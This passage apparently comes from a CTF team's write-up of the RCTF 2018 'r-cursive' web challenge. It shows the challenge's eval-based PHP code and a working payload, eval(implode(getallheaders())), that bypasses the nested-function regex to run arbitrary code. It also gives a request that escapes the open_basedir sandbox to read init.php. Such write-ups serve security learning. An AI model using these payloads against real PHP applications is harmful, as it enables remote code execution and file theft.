</span></span><span class=line><span class=cl>    <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>If we visit <code>http://r-cursive.ml/?action=go</code>, it will create a directory in a sandboxed environment and it will put a <code>index.php</code> file in it with the following code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>sha1</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>])</span> <span class=o>===</span> <span class=s1>&#39;#SHA1#&#39;</span> <span class=o>?:</span> <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;;&#39;</span> <span class=o>===</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/[^\W_]+\((?R)?\)/&#39;</span><span class=p>,</span> <span class=k>NULL</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=k>eval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span></code></pre></div><p>Finally, it will redirect us to that page, located at <code>*token*.sandbox.r-cursive.ml:1337/</code>.</p><p>Here there is an obvious arbitrary code execution, if we manage to bypass the filter&mldr;
Looking at the regex, we understand that it will only accept code in the form of <code>foo(bar(...))</code>, with an arbitrary number of nested function calls, where the outer function takes the inner function&rsquo;s return value as its only parameter. To execute code we can use <code>eval()</code>, but we need to find a way to pass an arbitrary string to it. Googling a bit, we came across <code>getallheaders()</code>, a nice function that returns an array containing all the request headers. Now that we have arbitrary input, we only need to <code>implode()</code> the array to have a string, and then pass it to <code>eval()</code>. The final payload is an HTTP request like this:</p><pre tabindex=0><code>GET /?cmd=eval(implode(getallheaders())); HTTP/1.1 
    a: print(&#39;Hello world!&#39;); // 
    Host: *token*.sandbox.r-cursive.ml:1337
</code></pre><p>And now, where is the flag?</p><h3 class="relative group">Sandbox escape<div id=sandbox-escape class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#sandbox-escape aria-label=Anchor>#</a></span></h3><p>We are inside a sandbox, with all the useful function like <code>system</code> or <code>exec</code> disabled by <code>php.ini</code>, and with a strict <code>open_basedir</code>.
About <code>open_basedir</code>, we see in the <code>phpinfo()</code> that it is restricted only to <code>/tmp</code> and to our sandbox, that is in the form of <code>sandbox/*token*</code>. In <code>/tmp</code> or in our sandbox there isn&rsquo;t anything useful. In the <code>phpinfo()</code> we noticed than there is a preloaded file, <code>sandbox/init.php</code>. What if this <code>init.php</code> is the file responsible for the <code>open_basedir</code> restriction?
So I tried to play with the DNS wildcard, to see if I could escape from the sandbox from there. We tried deleting the token, and the server responded with a 404&mldr; that&rsquo;s interesting. And then I tried requesting <code>init.php</code>&mldr; 200! Bingo, we are outside the sandbox. We then requested the <code>index.php</code> inside our sandbox, and indeed the <code>open_basedir</code> now points only to <code>sandbox/</code> and <code>/tmp</code>. I then read the <code>init.php</code> file, finding the flag inside: <code>RCTF{apache_mod_vhost_alias_should_be_configured_correctly}</code>.</p><p>Final payload:</p><pre tabindex=0><code>GET /*token*/?cmd=eval(implode(getallheaders())); HTTP/1.1 
    A: print(file_get_contents(&#39;../init.php&#39;)); // 
    Host: .sandbox.r-cursive.ml:1337
</code></pre></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/2018-05-27-rctf-2018-all-writeups/index.md data-oid-likes=likes_writeups/2018-05-27-rctf-2018-all-writeups/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/writeups/2018-05-20-defconctfquals-2018-all-writeups/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">DEFCON CTF QUALS 2018 - Write ups</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2018-05-20T00:00:00+00:00>20 May 2018</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/writeups/2018-06-27-google-ctf-2018-keygenme/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">KEYGENME - Google CTF 2018</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2018-06-27T00:00:00+00:00>27 June 2018</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
mhackeroni</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mhackeroni.it/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>